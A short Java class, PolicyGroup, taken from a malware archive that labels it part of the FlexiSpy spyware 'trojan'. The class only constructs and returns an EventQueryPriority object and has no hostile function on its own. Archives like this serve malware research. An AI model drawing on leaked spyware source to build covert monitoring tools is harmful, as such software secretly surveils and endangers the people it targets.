/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.daemon.appengine;

import com.vvt.eventrepository.querycriteria.EventQueryPriority;

public class PolicyGroup {
	
	public PolicyGroup() {

	}
	
	public EventQueryPriority getEventQueryPriority() {
		EventQueryPriority eventQueryPriority = new EventQueryPriority();
		return eventQueryPriority;
	}
}
